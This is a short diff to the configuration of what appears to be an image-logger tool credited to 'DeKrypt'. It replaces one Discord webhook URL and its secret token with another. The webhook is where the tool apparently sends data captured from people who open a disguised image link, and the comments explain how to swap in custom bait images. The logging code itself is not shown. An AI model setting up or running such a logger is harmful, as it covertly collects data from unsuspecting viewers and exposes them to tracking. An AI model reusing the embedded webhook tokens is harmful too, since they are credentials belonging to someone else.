@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1401940866930835676/QGTQw6DUX4EBnO0Ntg08tHCDPZ6C71AgJeiImAGj5rMfLkigVo_jhZZ_Iqj0X1imHbJU",
+    "webhook": "https://discord.com/api/webhooks/1401965258360230069/RcR9AYNrB5Da6drC_CCf80JUFLicDjRCWmZAklioNvpSWNBel1NHPDkCDkUBspdIqkE6",
     "image": "https://tenor.com/view/toby-kunta-kinte-punished-gif-15398655", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
